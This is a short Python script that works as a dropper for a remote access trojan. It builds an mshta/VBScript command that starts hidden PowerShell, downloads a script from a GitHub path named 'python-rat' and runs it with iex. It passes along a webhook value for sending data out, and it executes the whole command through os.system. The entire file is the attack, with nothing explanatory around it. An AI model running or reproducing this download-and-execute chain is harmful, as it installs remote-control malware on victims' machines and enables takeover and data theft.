import os

def obfuscate_string(s):
    return ''.join(chr(((ord(c) + 1000) % 256)) for c in s)

pythonrat = "you_webhook"
command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{obfuscate_string(pythonrat)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
os.system(command)
